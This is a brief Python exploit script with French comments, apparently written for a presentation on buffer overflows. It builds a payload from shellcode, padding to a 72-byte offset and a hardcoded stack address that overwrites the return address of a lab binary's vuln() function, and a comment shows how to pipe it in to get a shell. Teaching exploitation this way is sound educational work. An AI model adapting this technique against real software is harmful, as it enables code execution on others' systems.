#-*- coding: utf-8 -*-
# exploit.py --- 
# 
# Filename: exploit.py
# Description: exploit pour la presentation cyber sur les buffer overflow
# Author: guillaume
# Maintainer: 
# Created: mar. avril 18 16:15:29 2017 (+0200)
# Last-Updated: 
#           By: 
#     Update #: 0

# Code:

import struct

''' on lit le shellcode qu'on a généré '''
shellcode = open('shellcode.hex','r').read().strip().decode('hex')

''' a partir de 72 caractère on réécris l'adresse de retour de la fonction vuln() '''
offset = 72

''' l'adresse du buffer ou sera stocké notre shellcode '''
bufaddr= 0x7fffffffe250


payload = shellcode
payload +='A' * (offset - len(shellcode))
payload += struct.pack('<Q',bufaddr)



''' exploit with :
$~ (python exploit.py;cat)|./vuln 

enjoy your shell
'''
print payload


# 
# exploit.py ends here
